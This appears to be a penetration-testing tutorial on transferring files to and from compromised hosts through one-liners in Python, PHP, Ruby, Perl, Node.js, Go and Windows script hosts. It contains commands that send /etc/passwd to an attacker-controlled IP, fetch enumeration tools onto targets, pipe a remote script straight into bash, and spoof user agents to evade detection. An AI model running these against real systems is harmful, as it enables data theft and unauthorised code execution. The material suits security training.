# Transferring Files with Code

## Introduction

It's common to find different programming languages installed on the machines we are targeting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.

We can use some Windows default applications, such as `cscript` and `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.

According to Wikipedia, there are around 700 programming languages, and we can create code in any programming language to download, upload or execute instructions to the OS. This section provides examples using common programming languages.

## Python

Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option `-c`.

### Python Downloads

**Python 2 - Download:**
```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3 - Download:**
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Alternative Python 3 Methods:**
```python
# Using requests library
python3 -c 'import requests; r=requests.get("https://example.com/file.txt"); open("file.txt","wb").write(r.content)'

# Using urllib with custom headers
python3 -c 'import urllib.request; req=urllib.request.Request("https://example.com/file.txt", headers={"User-Agent": "Mozilla/5.0"}); urllib.request.urlretrieve(req, "file.txt")'
```

### Python Uploads

**Upload a File Using Python One-liner:**
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Multi-line Python Upload Example:**
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(URL, files={"files":file})
```

**Upload with Authentication:**
```python
python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files":open("/etc/passwd","rb")}, auth=("user","test123"))'
```

## PHP

PHP is also very prevalent and provides multiple file transfer methods. According to W3Techs' data, PHP is used by 77.4% of all websites with a known server-side programming language.

### PHP Downloads

**PHP Download with file_get_contents():**
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**PHP Download with fopen():**
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**PHP Download and Pipe to Bash:**
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**⚠️ Note:** The URL can be used as a filename with the `@file` function if the fopen wrappers have been enabled.

### PHP Alternative Methods

**Using cURL in PHP:**
```bash
php -r '$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://example.com/file.txt"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($ch); curl_close($ch); file_put_contents("file.txt", $data);'
```

**PHP Web Shell Upload:**
```php
<?php
if (isset($_POST['upload'])) {
    $file = $_FILES['file'];
    move_uploaded_file($file['tmp_name'], $file['name']);
    echo "File uploaded successfully";
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Upload">
</form>
```

## Ruby

Ruby is another popular language that supports running one-liners from an operating system command line using the option `-e`.

**Ruby - Download a File:**
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

**Ruby - Download with SSL:**
```bash
ruby -e 'require "net/http"; require "openssl"; uri = URI("https://example.com/file.txt"); http = Net::HTTP.new(uri.host, uri.port); http.use_ssl = true; http.verify_mode = OpenSSL::SSL::VERIFY_NONE; response = http.get(uri.path); File.write("file.txt", response.body)'
```

**Ruby - Upload File:**
```bash
ruby -e 'require "net/http"; require "net/http/post/multipart"; uri = URI("http://192.168.49.128:8000/upload"); File.open("/etc/passwd") {|f| req = Net::HTTP::Post::Multipart.new(uri.path, {"files" => UploadIO.new(f, "text/plain", "passwd")}); Net::HTTP.start(uri.host, uri.port) {|http| http.request(req)}}'
```

## Perl

Perl is widely available on many Linux systems and supports file transfer operations.

**Perl - Download a File:**
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

**Perl - Alternative Download Method:**
```bash
perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "https://example.com/file.txt"); my $file = $ff->fetch() or die $ff->error;'
```

**Perl - Upload File:**
```bash
perl -e 'use LWP::UserAgent; use HTTP::Request::Common qw(POST); my $ua = LWP::UserAgent->new; my $response = $ua->request(POST "http://192.168.49.128:8000/upload", Content_Type => "form-data", Content => [files => ["/etc/passwd"]]);'
```

## JavaScript (Windows)

JavaScript can be used on Windows systems through Windows Script Host (WSH).

**Create wget.js file:**
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Download a File Using JavaScript and cscript.exe:**
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

**Alternative JavaScript Method (using MSXML2):**
```javascript
var xhr = new ActiveXObject("MSXML2.XMLHTTP");
xhr.open("GET", WScript.Arguments(0), false);
xhr.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.type = 1;
stream.open();
stream.write(xhr.responseBody);
stream.saveToFile(WScript.Arguments(1), 2);
stream.close();
```

## VBScript (Windows)

VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

**Create wget.vbs file:**
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Download a File Using VBScript and cscript.exe:**
```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

**VBScript Upload Example:**
```vbscript
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set stream = CreateObject("Adodb.Stream")
stream.Type = 1
stream.Open
stream.LoadFromFile WScript.Arguments.Item(0)
http.Open "POST", WScript.Arguments.Item(1), False
http.setRequestHeader "Content-Type", "application/octet-stream"
http.Send stream.Read
stream.Close
```

## Node.js

If Node.js is available, it provides powerful file transfer capabilities.

**Node.js Download:**
```bash
node -e 'const https = require("https"); const fs = require("fs"); https.get("https://example.com/file.txt", (res) => { res.pipe(fs.createWriteStream("file.txt")); });'
```

**Node.js Upload:**
```bash
node -e 'const http = require("http"); const fs = require("fs"); const data = fs.readFileSync("/etc/passwd"); const options = {hostname: "192.168.49.128", port: 8000, path: "/upload", method: "POST"}; const req = http.request(options); req.write(data); req.end();'
```

## Go

Go might be available on some systems, especially in containerized environments.

**Go Download One-liner:**
```bash
echo 'package main; import ("io"; "net/http"; "os"); func main() { resp, _ := http.Get("https://example.com/file.txt"); defer resp.Body.Close(); out, _ := os.Create("file.txt"); defer out.Close(); io.Copy(out, resp.Body); }' > download.go && go run download.go
```

## Advanced Techniques

### Bypassing Restrictions

**Custom User Agents:**
```bash
# Python with custom User-Agent
python3 -c 'import urllib.request; req=urllib.request.Request("https://example.com/file.txt", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}); urllib.request.urlretrieve(req, "file.txt")'

# PHP with custom headers
php -r '$context = stream_context_create(["http" => ["header" => "User-Agent: Mozilla/5.0\r\n"]]); file_put_contents("file.txt", file_get_contents("https://example.com/file.txt", false, $context));'
```

**Using Proxies:**
```bash
# Python with proxy
python3 -c 'import urllib.request; proxy = urllib.request.ProxyHandler({"http": "http://proxy:8080"}); opener = urllib.request.build_opener(proxy); urllib.request.install_opener(opener); urllib.request.urlretrieve("http://example.com/file.txt", "file.txt")'
```

### Error Handling

**Python with Error Handling:**
```python
import urllib.request
try:
    urllib.request.urlretrieve("https://example.com/file.txt", "file.txt")
    print("Download successful")
except Exception as e:
    print(f"Download failed: {e}")
```

**PHP with Error Handling:**
```php
<?php
$file = @file_get_contents("https://example.com/file.txt");
if ($file !== false) {
    file_put_contents("file.txt", $file);
    echo "Download successful";
} else {
    echo "Download failed";
}
?>
```

## Upload Server Setup

**Starting the Python uploadserver Module:**
```bash
python3 -m uploadserver

# File upload available at /upload
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**PHP Upload Server:**
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_dir = '/tmp/uploads/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $filename = basename($_FILES['file']['name']);
    $target_path = $upload_dir . $filename;
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        echo "File uploaded successfully: " . $filename;
    } else {
        echo "File upload failed";
    }
}
?>
```

## Security Considerations

### Secure Downloads

**Verify SSL Certificates:**
```python
import urllib.request
import ssl

# Create SSL context that verifies certificates
context = ssl.create_default_context()
urllib.request.urlretrieve("https://example.com/file.txt", "file.txt", context=context)
```

**Check File Integrity:**
```python
import hashlib
import urllib.request

# Download file
urllib.request.urlretrieve("https://example.com/file.txt", "file.txt")

# Verify checksum
with open("file.txt", "rb") as f:
    file_hash = hashlib.sha256(f.read()).hexdigest()
    print(f"File SHA256: {file_hash}")
```

### Sanitize Uploads

**Validate File Types:**
```python
import os
import mimetypes

allowed_types = ['text/plain', 'image/jpeg', 'image/png']
filename = "uploaded_file.txt"

mime_type, _ = mimetypes.guess_type(filename)
if mime_type in allowed_types:
    print("File type allowed")
else:
    print("File type not allowed")
```

## Practical Examples

### Multi-Language Download Script

**Bash Script with Fallback Methods:**
```bash
#!/bin/bash
URL="https://example.com/file.txt"
OUTPUT="file.txt"

# Try Python3
if command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.request; urllib.request.urlretrieve('$URL', '$OUTPUT')"
    exit 0
fi

# Try Python2
if command -v python2 >/dev/null 2>&1; then
    python2 -c "import urllib; urllib.urlretrieve('$URL', '$OUTPUT')"
    exit 0
fi

# Try PHP
if command -v php >/dev/null 2>&1; then
    php -r "file_put_contents('$OUTPUT', file_get_contents('$URL'));"
    exit 0
fi

# Try Ruby
if command -v ruby >/dev/null 2>&1; then
    ruby -e "require 'net/http'; File.write('$OUTPUT', Net::HTTP.get(URI.parse('$URL')))"
    exit 0
fi

# Try Perl
if command -v perl >/dev/null 2>&1; then
    perl -e "use LWP::Simple; getstore('$URL', '$OUTPUT');"
    exit 0
fi

echo "No suitable programming language found for download"
exit 1
```

### Detection Evasion

**Randomized User Agents:**
```python
import random
import urllib.request

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

ua = random.choice(user_agents)
req = urllib.request.Request("https://example.com/file.txt", headers={"User-Agent": ua})
urllib.request.urlretrieve(req, "file.txt")
```

## Key Takeaways

1. **Multiple languages available** - Most systems have at least one scripting language installed
2. **One-liners are powerful** - Quick execution without creating files on disk
3. **Cross-platform compatibility** - Python and other languages work on multiple OS
4. **Windows-specific options** - JavaScript and VBScript through cscript.exe
5. **Error handling important** - Always implement proper error checking
6. **Security considerations** - Validate certificates, check file integrity
7. **Fallback methods** - Use multiple languages as backup options
8. **Steganography potential** - Code can be hidden in legitimate scripts

## References

- [Python urllib Documentation](https://docs.python.org/3/library/urllib.html)
- [PHP File Functions](https://www.php.net/manual/en/ref.filesystem.php)
- [Ruby Net::HTTP Documentation](https://ruby-doc.org/stdlib-3.0.0/libdoc/net/rdoc/Net/HTTP.html)
- [Perl LWP::Simple Documentation](https://metacpan.org/pod/LWP::Simple)
- [Windows Script Host Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/9bbdkx3k(v=vs.84))
- [Node.js HTTP Documentation](https://nodejs.org/api/http.html) 